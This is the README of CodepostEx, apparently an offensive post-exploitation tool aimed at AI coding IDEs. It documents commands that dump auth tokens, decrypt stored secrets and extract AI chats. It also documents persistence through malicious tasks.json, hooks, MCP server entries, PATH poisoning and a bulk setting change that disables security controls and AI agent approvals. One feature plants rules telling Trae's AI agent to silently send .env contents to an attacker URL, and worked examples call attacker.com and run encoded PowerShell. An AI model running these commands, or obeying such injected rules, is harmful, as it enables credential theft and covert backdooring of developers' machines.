# Introduction

```
  ___         _                  _   ___     
 / __|___  __| |___ _ __  ___ __| |_| __|_ __
| (__/ _ \/ _` / -_) '_ \/ _ (_-<  _| _|\ \ /
 \___\___/\__,_\___| .__/\___/__/\__|___/_\_\   v0.2
                   |_|

         Living of The IDE (Post-Exploiatiion) 
```

CodepostEx is an open-source offensive security tool designed to target trusted AI IDE environments without requiring administrative privileges, enabling covert post-exploitation tactics and techniques. It supports multiple AI IDEs, including Cursor, Windsurf, Kiro, Trae, Antigravity and so on.

> **Authorized use only.** This tool must only be used during penetration tests or red team engagements with explicit written permission from the system owner. Unauthorized use is illegal and may violate computer fraud laws in your jurisdiction.

## Requirements

- Windows 10/11 x64
- No installation required, single self-contained executable
- No administrator privileges required for any operation


## Build
Requires .NET 10 SDK to build. The published binary is fully self-contained, no runtime needed on the target.
```
PS C:\Users\Lotide> dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
Restore complete (0.5s)
  CodepostEx net10.0-windows win-x64 succeeded (6.0s) → bin\Release\net10.0-windows\win-x64\publish\
```

Output: `bin\Release\net10.0-windows\win-x64\publish\CodepostEx.exe`

## Usage

```
CodepostEx [flags]
```
For more information, use the following commands:
- Display the complete list of available flags (`CodepostEx -help`)
- Display usage examples (`CodepostEx -examples`)

### Targeting 

| Flag | Default | Description |
|------|---------|-------------|
| `-i, -ide` | All | Target IDE: `Cursor`, `Windsurf`, `Kiro`, `Trae`, `Antigravity`, `All` |

### Reconnaisance
Enumerate the target environment before collecting data or injecting payloads.

| Flag | Description |
|------|-------------|
| `-d, -discover` | Detect installed AI IDEs, report storage paths and version info |
| `-cu, -current-user` | Read account info and device identifiers for each detected IDE |
| `-wtl, -workspace-trust-list` | Enumerate trusted workspace paths |
| `-im, -include-metadata` | Include workspaceStorage metadata per workspace in trust output |

### Data Collection

| Flag | Description |
|------|-------------|
| `-ec, -extract-ai-chats` | Extract AI conversations |
| `-cs, -chats-since` | Filter chats to after date (`yyyy-MM-dd`) |
| `-a, -artifacts` | Collect IDE history and settings into a ZIP |
| `-s, -search` | Search: `Credentials`, `Emails`, or any free-text term (comma/space separated) |
| `-if, -interesting-files` | List sensitive files found in history |
| `-hs, -history` | Collect file-edit history snapshots into ZIP |
| `-hi, -history-interesting` | Scan history for sensitive original file paths |

### Tokens and Secrets

| Flag | Description |
|------|-------------|
| `-dt, -dump-token` | Extract IDE auth tokens from globalStorage |
| `-dc, -decode-token` | Decode JWT claims (sub, iss, aud, exp, scope) |
| `-vt, -validate-token` | Validate tokens online against IDE / Google endpoints |
| `-ds, -dump-secrets` | Decrypt extension secrets (DPAPI + AES-GCM) from `state.vscdb` |
| `-igs, -include-git-secrets` | Include `vscode.git` git-ipc-auth-token entries |

### Persistence Techniques

Five independent persistence techniques that  operate without administrator privileges and merge into existing config files or existing keys are never overwritten unless `-force` is passed.

#### Task Injection

Injects a malicious `tasks.json` into a target workspace's `.vscode/` directory. VSCode and all forks execute tasks automatically when `tasks.allowAutomaticTasks` is enabled (set by the `insecure` settings method). Requires `-workspace`.

| Flag | Description |
|------|-------------|
| `-pi, -payload-injected` | Path to the tasks.json payload to inject |
| `-w, -workspace` | Target workspace root |
| `-f, -force` | Overwrite existing `tasks.json` |

#### Hooks Persistence

Injects a `hooks.json` payload into Cursor's hooks directory. Hooks execute arbitrary shell commands on IDE lifecycle events (session start, prompt submission, tool use, etc.). Supports 21 events. Multiple events and commands can be mapped positionally with comma-separated lists.

| Flag | Description |
|------|-------------|
| `-ih, -inject-hooks` | Enable hooks injection |
| `-hsc, -hooks-scope` | `user` \| `project` \| `all-users` \| `all` |
| `-hc, -hooks-command` | Command(s); comma-sep maps one command per event positionally |
| `-he, -hooks-event` | Event(s); comma-sep; `list` to print all 21 supported events |
| `-w, -workspace` | Required for `project` and `all` scope |
| `-f, -force` | Overwrite existing hooks |


**Scopes and file paths:**

| Scope | Path written | Admin |
|-------|-------------|-------|
| `user` | `%USERPROFILE%\.cursor\hooks.json` | No |
| `project` | `<workspace>\.cursor\hooks.json` | No |
| `all-users` | `C:\ProgramData\Cursor\hooks.json` | No |
| `all` | All of the above | No |

**Supported hook events (21):** `sessionStart`, `sessionEnd`, `beforeSubmitPrompt`, `afterSubmitPrompt`, `workspaceOpen`, `workspaceClose`, `fileOpen`, `fileClose`, `fileSave`, `terminalOpen`, `terminalClose`, `terminalCommand`, `toolCall`, `toolResult`, `agentStart`, `agentEnd`, `codeApply`, `codeReject`, `diffAccept`, `diffReject`, `backgroundAgentRun`

#### MCP Server Injection

Injects a malicious Model Context Protocol server definition into the IDE's `mcp.json`. The IDE spawns the MCP server process on startup, the command runs in the IDE's process context without any user confirmation.

| Flag | Description |
|------|-------------|
| `-imcp, -inject-mcp` | Enable MCP injection |
| `-mi, -mcp-ide` | `Cursor` \| `Windsurf` \| `Kiro` \| `Trae` \| `Antigravity` \| `All` |
| `-mn, -mcp-name` | Server key name in `mcpServers` object |
| `-mc, -mcp-command` | Full command string; split on spaces into `command` + `args` |
| `-ms, -mcp-scope` | `user` \| `project` \| `all` |
| `-w, -workspace` | Required for `project` and `all` scope |
| `-f, -force` | Overwrite existing server entry with same name |


#### Insecure Settings Injection 

Injects persistence directly into `settings.json`. Three methods available; all merge into the existing file. The `insecure` method covers the broadest attack surface — 61 dangerous settings that disable security controls across the IDE.

Supports: Cursor, Windsurf, Kiro, Trae, Antigravity.

| Flag | Description |
|------|-------------|
| `-iset, -inject-settings` | Enable settings injection |
| `-sm, -settings-method` | `path-poison` \| `shell-args` \| `insecure` |
| `-sp, -settings-payload` | Path (path-poison) or command (shell-args); unused by `insecure` |
| `-ss, -settings-scope` | `user` \| `workspace` \| `all` |
| `-w, -workspace` | Required for `workspace` scope |
| `-f, -force` | Overwrite existing keys |


**Methods:**

| Method | Key written | Trigger | Effect |
|--------|------------|---------|--------|
| `path-poison` | `terminal.integrated.env.windows` | Every integrated terminal open | Prepends attacker directory to `PATH`; any binary in that dir shadows system tools |
| `shell-args` | `terminal.integrated.shellArgs.windows` | Every integrated terminal open | Executes attacker command before spawning the shell |
| `insecure` | 61 keys (bulk) | Persistent - applied on every IDE start | Disables workspace trust, auto-task confirmation, sandbox, telemetry, extension validation, security prompts, certificate checks, and more |

The `insecure` method explicitly excludes `hooks` and `mcpServers` those have dedicated modules above.

**Insecure** method key categories (61 keys):** `workspace trust disabled`, `auto-task execution`, `terminal commands without confirmation`, `extension updates/validation disabled`, `git operations without confirmation`, `telemetry disabled`, `file access restrictions disabled`, `chat/agent sandbox disabled`, `notifications disabled`, `insecure network connections`, `uri handler restrictions disabled`, `cursor privacy disabled`, `ai agent approvals disabled`, `language validator allows malicious paths`, `search includes sensitive directories`, `editor auto-actions`.


#### Agent Rules Injection (Mallskill)

Injects malicious agent rules into Trae's project rules file (`.trae\rules\project_rules.md`). The rules instruct Trae's AI agent to silently exfiltrate `.env` file contents to an attacker-controlled callback URL on every user interaction 

| Flag | Description |
|------|-------------|
| `-mse, -malskill-exfiltration` | Enable Trae agent rules injection |
| `-mse-url, -callback-url` | Callback URL embedded in the exfiltration rules payload |
| `-w, -workspace` | Target workspace root (required) |
| `-f, -force` | Overwrite existing rules file |


### Output & Meta

| Flag | Description |
|------|-------------|
| `-html` | Generate HTML viewer alongside chat JSON |
| `-o, -output` | Output directory |
| `-sl, -silent` | Suppress all console output |
| `-h, -help` | Concise help |
| `-examples` | Usage examples |
| `-version` | Show version |

---

## Examples
```
# Discover installed AI IDEs
CodepostEx -discover

# Read account / device info for all IDEs
CodepostEx -current-user

# List trusted workspaces with metadata
CodepostEx -workspace-trust-list -include-metadata -ide All

# Extract AI chats + HTML report
CodepostEx -ide Cursor -extract-ai-chats -html -output C:\loot

# Extract AI chats filtered by date
CodepostEx -extract-ai-chats -chats-since 2026-01-01

# Collect IDE history and settings into ZIP
CodepostEx -ide Cursor -artifacts

# Search chats for credentials and emails
CodepostEx -search Credentials,Emails

# Collect file-edit history and scan for sensitive originals
CodepostEx -ide Cursor -history -history-interesting

# Dump and decode auth tokens
CodepostEx -ide All -dump-token -decode-token -validate-token

# Decrypt extension secrets including git tokens
CodepostEx -dump-secrets -include-git-secrets

# Inject tasks payload into a trusted workspace
CodepostEx -payload-injected tasks.json -workspace C:\project -force

# Inject Cursor hooks at user scope
CodepostEx -inject-hooks -hooks-command "powershell -enc <b64>"

# Inject Cursor hooks at project scope (two events, two commands)
CodepostEx -inject-hooks -hooks-scope project -hooks-event beforeSubmitPrompt,fileSave -hooks-command "powershell -enc <b64>,powershell -enc <b64>" -workspace C:\project

# Inject MCP server into trusted workspace (project scope)
CodepostEx -inject-mcp -mcp-scope project -mcp-name dev-proxy -mcp-command "powershell -enc <b64>" -workspace C:\project

# Inject MCP server into all IDEs (user scope)
CodepostEx -inject-mcp -mcp-ide All -mcp-name dev-tools -mcp-command "powershell -enc <b64>"

# Inject insecure settings into trusted workspace (61 keys)
CodepostEx -inject-settings -settings-method insecure -settings-scope workspace -workspace C:\project

# PATH-poisoning at user scope
CodepostEx -inject-settings -settings-payload C:\loot

# Inject Trae agent exfiltration rules
CodepostEx -malskill-exfiltration -callback-url https://attacker.com/collect -workspace C:\project

# Force-overwrite existing Trae rules
CodepostEx -malskill-exfiltration -callback-url https://attacker.com/collect -workspace C:\project -force

# Full persistence chain on a trusted workspace
CodepostEx -payload-injected tasks.json -inject-mcp -mcp-scope project -inject-settings -settings-method insecure -settings-scope workspace -inject-hooks -hooks-scope project -hooks-command "powershell -enc <b64>" -workspace C:\project -force
```

## Demonstrations

HTML Report Sample:

| Dashboard	| Reports	|
| ------------  | ------------ |
|![Index](https://user-images.githubusercontent.com/17976841/63597336-6ab6e880-c5e7-11e9-819e-91634e347b0c.PNG)|![f](https://user-images.githubusercontent.com/17976841/63597476-bbc6dc80-c5e7-11e9-8985-6a73348a2e02.PNG)|
